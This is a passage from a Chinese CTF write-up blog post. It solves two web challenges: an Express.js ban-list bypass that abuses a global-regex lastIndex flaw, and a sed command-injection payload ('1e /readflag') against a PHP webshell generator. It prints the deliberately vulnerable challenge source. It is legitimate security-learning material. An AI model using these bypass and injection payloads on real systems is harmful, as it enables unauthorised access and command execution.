class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> child_process = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>()</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>())</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">80</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">escapeRegExp</span>(<span class="params">string</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> string.<span class="title function_">replace</span>(<span class="regexp">/[.*+?^$&#123;&#125;()|[\]\\]/g</span>, <span class="string">&#x27;\\$&amp;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> users = &#123;</span><br><span class="line">    <span class="string">&quot;admin&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;user&quot;</span>: <span class="string">&quot;user&quot;</span>,</span><br><span class="line">    <span class="string">&quot;guest&quot;</span>: <span class="string">&quot;guest&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;hacker&#x27;</span>:<span class="string">&#x27;hacker&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> banned_users = [<span class="string">&#x27;hacker&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">// 你不准getflag</span></span><br><span class="line">banned_users.<span class="title function_">push</span>(<span class="string">&quot;admin&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> banned_users_regex = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">build_banned_users_regex</span>(<span class="params"></span>) &#123;</span><br><span class="line">	<span class="keyword">let</span> regex_string = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> username <span class="keyword">of</span> banned_users) &#123;</span><br><span class="line">        regex_string += <span class="string">&quot;^&quot;</span> + escapeRegExp(username) + <span class="string">&quot;$&quot;</span> + <span class="string">&quot;|&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    regex_string = regex_string.<span class="title function_">substring</span>(<span class="number">0</span>, regex_string.<span class="property">length</span> - <span class="number">1</span>)</span><br><span class="line">    banned_users_regex = <span class="keyword">new</span> <span class="title class_">RegExp</span>(regex_string, <span class="string">&quot;g&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//鉴权中间件</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">requireLogin</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> username = req.<span class="property">body</span>.<span class="property">username</span></span><br><span class="line">    <span class="keyword">let</span> password = req.<span class="property">body</span>.<span class="property">password</span></span><br><span class="line">    <span class="keyword">if</span> (!username || !password) &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;用户名或密码不能为空&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> username !== <span class="string">&quot;string&quot;</span> || <span class="keyword">typeof</span> password !== <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;用户名或密码不合法&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 基于正则技术的封禁用户匹配系统的设计与实现</span></span><br><span class="line">    <span class="keyword">let</span> test1 = banned_users_regex.<span class="title function_">test</span>(username)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`使用正则<span class="subst">$&#123;banned_users_regex&#125;</span>匹配<span class="subst">$&#123;username&#125;</span>的结果为：<span class="subst">$&#123;test1&#125;</span>`</span>)</span><br><span class="line">    <span class="keyword">if</span> (test1) &#123;</span><br><span class="line">		<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;第一个判断匹配到封禁用户：&quot;</span>,username)</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;用户&#x27;&quot;</span>+username + <span class="string">&quot;&#x27;被封禁，无法鉴权！&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 基于in关键字的封禁用户匹配系统的设计与实现</span></span><br><span class="line">    <span class="keyword">let</span> test2 = (username <span class="keyword">in</span> banned_users)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`使用in关键字匹配<span class="subst">$&#123;username&#125;</span>的结果为：<span class="subst">$&#123;test2&#125;</span>`</span>)</span><br><span class="line">    <span class="keyword">if</span> (test2)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;第二个判断匹配到封禁用户：&quot;</span>,username)</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;用户&#x27;&quot;</span>+username + <span class="string">&quot;&#x27;被封禁，无法鉴权！&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (username <span class="keyword">in</span> users &amp;&amp; users[username] === password) &#123;</span><br><span class="line">        <span class="title function_">next</span>()</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&quot;用户名或密码错误，鉴权失败！&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">registerUser</span>(<span class="params">username, password</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> username !== <span class="string">&quot;string&quot;</span> || username.<span class="property">length</span> &gt; <span class="number">20</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;用户名不合法&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> password !== <span class="string">&quot;string&quot;</span> || password.<span class="property">length</span> &gt; <span class="number">20</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;密码不合法&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (username <span class="keyword">in</span> users) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;用户已存在&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> existing_user <span class="keyword">in</span> users)&#123;</span><br><span class="line">        <span class="keyword">let</span> existing_user_password = users[existing_user]</span><br><span class="line">        <span class="keyword">if</span> (existing_user_password === password)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">`您的密码已经被用户&#x27;<span class="subst">$&#123;existing_user&#125;</span>&#x27;使用了，请使用其它的密码`</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    users[username] = password</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;注册成功&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(<span class="string">&#x27;public&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 每次请求前，更新封禁用户正则信息</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="keyword">function</span> (<span class="params">req, res, next</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="title function_">build_banned_users_regex</span>()</span><br><span class="line">		<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;封禁用户正则表达式（满足这个正则表达式的用户名为被封禁用户名）：&quot;</span>,banned_users_regex)</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">next</span>()</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/api/register&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> username = req.<span class="property">body</span>.<span class="property">username</span></span><br><span class="line">    <span class="keyword">let</span> password = req.<span class="property">body</span>.<span class="property">password</span></span><br><span class="line">    <span class="keyword">let</span> message = <span class="title function_">registerUser</span>(username, password)</span><br><span class="line">    res.<span class="title function_">send</span>(message)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/api/login&quot;</span>, requireLogin, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&quot;登录成功！&quot;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/api/flag&quot;</span>, requireLogin, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> username = req.<span class="property">body</span>.<span class="property">username</span></span><br><span class="line">    <span class="keyword">if</span> (username !== <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;登录成功，但是只有&#x27;admin&#x27;用户可以看到flag，你的用户名是&#x27;&quot;</span> + username + <span class="string">&quot;&#x27;&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> flag = child_process.<span class="title function_">execSync</span>(<span class="string">&quot;cat flag&quot;</span>).<span class="title function_">toString</span>()</span><br><span class="line">    res.<span class="title function_">end</span>(flag)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;有人获取到了flag！为了保证题目的正常运行，将会重置靶机环境！&quot;</span>)</span><br><span class="line">    res.<span class="title function_">on</span>(<span class="string">&quot;finish&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123; process.<span class="title function_">exit</span>(<span class="number">0</span>) &#125;, <span class="number">1</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/api/ban_user&#x27;</span>, requireLogin, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> username = req.<span class="property">body</span>.<span class="property">username</span></span><br><span class="line">    <span class="keyword">let</span> ban_username = req.<span class="property">body</span>.<span class="property">ban_username</span></span><br><span class="line">    <span class="keyword">if</span>(!ban_username)&#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;ban_username不能为空&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(username === ban_username)&#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;不能封禁自己&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> name <span class="keyword">of</span> banned_users)&#123;</span><br><span class="line">        <span class="keyword">if</span> (name === ban_username) &#123;</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">&quot;用户已经被封禁&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    banned_users.<span class="title function_">push</span>(ban_username)</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&quot;封禁成功！&quot;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">redirect</span>(<span class="string">&quot;/static/index.html&quot;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(port, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`listening on port <span class="subst">$&#123;port&#125;</span>`</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>源码如上，思路就是怎么绕过黑名单，登录admin，去获取flag。<br>这里主要是有2个waf，在<code>requireLogin</code>函数里，其中一个逻辑如下</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> test2 = (username <span class="keyword">in</span> banned_users)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`使用in关键字匹配<span class="subst">$&#123;username&#125;</span>的结果为：<span class="subst">$&#123;test2&#125;</span>`</span>)</span><br><span class="line">    <span class="keyword">if</span> (test2)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;第二个判断匹配到封禁用户：&quot;</span>,username)</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;用户&#x27;&quot;</span>+username + <span class="string">&quot;&#x27;被封禁，无法鉴权！&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (username <span class="keyword">in</span> users &amp;&amp; users[username] === password) &#123;</span><br><span class="line">        <span class="title function_">next</span>()</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&quot;用户名或密码错误，鉴权失败！&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>in关键词？在nodejs里in的意思可不一样，他表示属性是否存在，就算你填admin，那也不会被识别，因为banned_users数组并没有admin属性，他只有索引。那也就是说第二个waf是白给的，剩下的需要绕过test1，而test1的绕过和<code>new RegExp(regex_string, &quot;g&quot;)</code>有关，询问chatgpt后发现<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703692450746-40c664f8-a092-4640-8dbd-eaa39ab15603.png#averageHue=%2364c99d&clientId=u10daa159-f587-4&from=paste&height=768&id=uec46a5b9&originHeight=768&originWidth=1045&originalType=binary&ratio=1&rotation=0&showTitle=false&size=61545&status=done&style=none&taskId=u94b6507b-b51a-42c5-b622-022192443d7&title=&width=1045" alt="image.png"><br>意思也就是每次识别的时候index会往后移，图中的例子第一次没识别的时候index为0，从识别123到识别456，index会从0到8，然后456到789移动到16，也就是<code>4</code>和<code>7</code>的后一位。但是题目用了一个中间件</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(<span class="keyword">function</span> (<span class="params">req, res, next</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="title function_">build_banned_users_regex</span>()</span><br><span class="line">		<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;封禁用户正则表达式（满足这个正则表达式的用户名为被封禁用户名）：&quot;</span>,banned_users_regex)</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">next</span>()</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">build_banned_users_regex</span>(<span class="params"></span>) &#123;</span><br><span class="line">	<span class="keyword">let</span> regex_string = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> username <span class="keyword">of</span> banned_users) &#123;</span><br><span class="line">        regex_string += <span class="string">&quot;^&quot;</span> + escapeRegExp(username) + <span class="string">&quot;$&quot;</span> + <span class="string">&quot;|&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    regex_string = regex_string.<span class="title function_">substring</span>(<span class="number">0</span>, regex_string.<span class="property">length</span> - <span class="number">1</span>)</span><br><span class="line">    banned_users_regex = <span class="keyword">new</span> <span class="title class_">RegExp</span>(regex_string, <span class="string">&quot;g&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>导致每次index都会清空，那么假如能不让他清空，index识别一次后就会后移，第二次识别就识别不到了。这个方法也很简单，就是让<code>build_banned_users_regex</code>报错，这样这个中间件就作废了。报错的方法之前在其他比赛有见过，由于调用了<code>escapeRegExp</code>函数，让username不为字符串就会报错了，让他为对象或者其他的都可以，我们往banned_user里面push一个对象就好了。先注册一个用户，然后把这个用户ban了<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703693123924-6d24d97a-6745-4acf-9db5-15513ba92cf3.png#averageHue=%239da073&clientId=u10daa159-f587-4&from=paste&height=676&id=u4352d9f4&originHeight=676&originWidth=1401&originalType=binary&ratio=1&rotation=0&showTitle=false&size=86199&status=done&style=none&taskId=u72a75c36-831c-4b6c-90fe-0ef06a71ee6&title=&width=1401" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703693119745-d3c849b3-edde-497e-b42c-8337e559aced.png#averageHue=%233c404e&clientId=u10daa159-f587-4&from=paste&height=152&id=u9622622e&originHeight=152&originWidth=950&originalType=binary&ratio=1&rotation=0&showTitle=false&size=12482&status=done&style=none&taskId=u50283d20-f967-485b-a0c2-72bdd9bd167&title=&width=950" alt="image.png"><br>往banned_user推入了一个对象。那么我们在下次访问时就会<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703693191228-8b95c0ea-8287-4ba2-9aaf-2ae1548f93cb.png#averageHue=%239da67c&clientId=u10daa159-f587-4&from=paste&height=676&id=u4ab664b1&originHeight=676&originWidth=1401&originalType=binary&ratio=1&rotation=0&showTitle=false&size=93015&status=done&style=none&taskId=uc7e1d88f-dd18-4987-9331-17e9a2c00a8&title=&width=1401" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703693264352-f2ab79e6-f7c4-4170-85f1-0f4bfdbe7a4b.png#averageHue=%2330343d&clientId=u10daa159-f587-4&from=paste&height=562&id=u41f2aa1b&originHeight=562&originWidth=1995&originalType=binary&ratio=1&rotation=0&showTitle=false&size=95862&status=done&style=none&taskId=u83c89d93-1199-4fb8-aae1-4b3490eb19f&title=&width=1995" alt="image.png"><br>第一次访问后这个lastIndex变成了5，第二次访问后<br>由于build方法内报错，无法重置了，因此这次识别为false，获取flag<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703693343347-5da5ab8f-3359-4be3-81d8-116e2a552ff9.png#averageHue=%232e323c&clientId=u10daa159-f587-4&from=paste&height=558&id=ufb248a5c&originHeight=558&originWidth=1617&originalType=binary&ratio=1&rotation=0&showTitle=false&size=106988&status=done&style=none&taskId=u3ab9824d-8009-4d55-9966-cd5b0fd4de3&title=&width=1617" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703693368663-3b6b289d-ad46-4b0a-9d5e-98dc46ccbf66.png#averageHue=%232f2f2f&clientId=u10daa159-f587-4&from=paste&height=499&id=u3f7c0955&originHeight=499&originWidth=1271&originalType=binary&ratio=1&rotation=0&showTitle=false&size=108971&status=done&style=none&taskId=ub5abeed4-c274-4d25-ac52-61a8caa818c&title=&width=1271" alt="image.png"><br>这里是windows没cat指令，远程就通了。</p>
<h1 id="webshell-generator"><a href="#webshell-generator" class="headerlink" title="webshell generator"></a>webshell generator</h1><p>114出的<br>sed指令注入。听说是给了附件，给了附件后可能就相对于简单一点。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">security_validate</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\r|\n/&#x27;</span>, <span class="variable">$value</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;<span class="subst">$key</span> 不能包含换行符！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$value</span>) &gt; <span class="number">114</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;<span class="subst">$key</span> 不能超过114个字符！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">security_validate</span>();</span><br><span class="line"><span class="keyword">if</span> (@<span class="variable">$_POST</span>[<span class="string">&#x27;method&#x27;</span>] &amp;&amp; @<span class="variable">$_POST</span>[<span class="string">&#x27;key&#x27;</span>] &amp;&amp; @<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>]) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;language&#x27;</span>] !== <span class="string">&#x27;PHP&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;PHP是最好的语言&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$method</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;method&#x27;</span>];</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;METHOD=<span class="subst">$method</span>&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;你的method太复杂了！&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;KEY=<span class="subst">$key</span>&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;你的key太复杂了！&quot;</span>);</span><br><span class="line">    <span class="variable">$status_code</span> = -<span class="number">1</span>;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;sh generate.sh&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$filename</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;生成失败了！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: download.php?file=<span class="subst">$filename</span>&amp;filename=<span class="subst">&#123;$_POST[&#x27;filename&#x27;]&#125;</span>&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里给KEY和METHOD赋值后就运行了generate.sh</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">set -e</span><br><span class="line"></span><br><span class="line">NEW_FILENAME=$(tr -dc a-z0-9 &lt;/dev/urandom | head -c 16)</span><br><span class="line">cp template.php &quot;/tmp/$NEW_FILENAME&quot;</span><br><span class="line">cd /tmp</span><br><span class="line"></span><br><span class="line">sed -i &quot;s/KEY/$KEY/g&quot; &quot;$NEW_FILENAME&quot;</span><br><span class="line">sed -i &quot;s/METHOD/$METHOD/g&quot; &quot;$NEW_FILENAME&quot;</span><br><span class="line"></span><br><span class="line">realpath &quot;$NEW_FILENAME&quot;</span><br></pre></td></tr></table></figure>
<p>这里存在一个sed指令，其中KEY和METHOD我们是可控的，然后templates文件如下</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_METHOD[&quot;KEY&quot;]);</span><br></pre></td></tr></table></figure>
<p>会把上述的METHOD和KEY替换为我们输入的东西，然后给我们下载，这里存在sed指令注入。<br><code>sed -i &quot;s/KEY//g;1e /readflag;s///g&quot; &quot;/tmp/123&quot;</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703693821339-b8a6ef6d-4187-44cf-9dac-b0d6ee8ec57b.png#averageHue=%23080604&clientId=u10daa159-f587-4&from=paste&height=292&id=udf954163&originHeight=292&originWidth=778&originalType=binary&ratio=1&rotation=0&showTitle=false&size=19323&status=done&style=none&taskId=ub3a18217-4b41-4d21-95a7-e45cd1b7d8e&title=&width=778" alt="image.png"><br>e参数可以执行命令，会把执行结果放到第一行，然后我们只需要闭合一下前后语句即可。<code>s/KEY//g</code>会把key置空，然后<code>s///g</code>没啥用，把空格替换为空格，那么显而易见我们最终的payload为<code>key=/g;1e /readflag;s//</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703693984471-8d3e5245-7422-4319-a221-ff691bcc8ccb.png#averageHue=%23839659&clientId=u10daa159-f587-4&from=paste&height=676&id=u7e993089&originHeight=676&originWidth=1401&originalType=binary&ratio=1&rotation=0&showTitle=false&size=142917&status=done&style=none&taskId=u7a6d8089-2666-4b48-8b92-29e09eced08&title=&width=1401" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703693975993-763050bd-2061-4203-8166-b7db12a42508.png#averageHue=%23899a63&clientId=u10daa159-f587-4&from=paste&height=676&id=ua4370290&originHeight=676&originWidth=1401&originalType=binary&ratio=1&rotation=0&showTitle=false&size=133339&status=done&style=none&taskId=ue94c90d3-abce-48e2-9aa7-ebab4f9e954&title=&width=1401" alt="image.png"><br>至此所有题目复现完毕</p>
<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>TubeMQ和ClickHouse比较喜欢，其他的题也很有趣味性，学到了很多。</p>

    </div>

    
    <div class="about">
        <h1>About this Post</h1>
        <div class="details">
            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
        </div>
        
        <p class="tags">
            
            <i class="icon"></i>
            <a href="/tags/WriteUp/" class="tag">#WriteUp</a>
        </p>
        
